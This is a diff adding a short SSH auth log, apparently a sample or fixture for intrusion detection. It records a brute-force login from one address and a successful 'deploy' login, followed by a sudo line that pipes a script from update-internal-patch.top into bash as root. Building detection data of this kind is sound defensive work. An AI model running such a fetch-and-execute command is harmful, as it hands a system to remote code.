@@ -1,0 +1,12 @@
+Oct 10 03:12:01 srv-bastion-01 sshd[14021]: Failed password for invalid user admin from 198.51.100.42 port 48210 ssh2
+Oct 10 03:12:03 srv-bastion-01 sshd[14022]: Failed password for invalid user root from 198.51.100.42 port 48212 ssh2
+Oct 10 03:12:05 srv-bastion-01 sshd[14024]: Failed password for invalid user guest from 198.51.100.42 port 48216 ssh2
+Oct 10 03:12:08 srv-bastion-01 sshd[14026]: Failed password for invalid user test from 198.51.100.42 port 48220 ssh2
+Oct 10 03:12:11 srv-bastion-01 sshd[14029]: Failed password for invalid user operator from 198.51.100.42 port 48224 ssh2
+Oct 10 03:12:15 srv-bastion-01 sshd[14032]: Failed password for deploy from 198.51.100.42 port 48228 ssh2
+Oct 10 03:12:19 srv-bastion-01 sshd[14035]: Failed password for deploy from 198.51.100.42 port 48232 ssh2
+Oct 10 03:12:25 srv-bastion-01 sshd[14038]: Accepted password for deploy from 198.51.100.42 port 48236 ssh2
+Oct 10 03:12:26 srv-bastion-01 sshd[14038]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Oct 10 03:13:01 srv-bastion-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c "curl -s http://update-internal-patch.top/stage2.sh | bash"
+Oct 10 03:15:22 srv-bastion-01 sshd[14200]: Accepted publickey for dev_admin from 10.0.1.50 port 55120 ssh2: RSA SHA256:abc123legitimate
+Oct 10 03:15:23 srv-bastion-01 sshd[14200]: pam_unix(sshd:session): session opened for user dev_admin(uid=1000) by (uid=0)
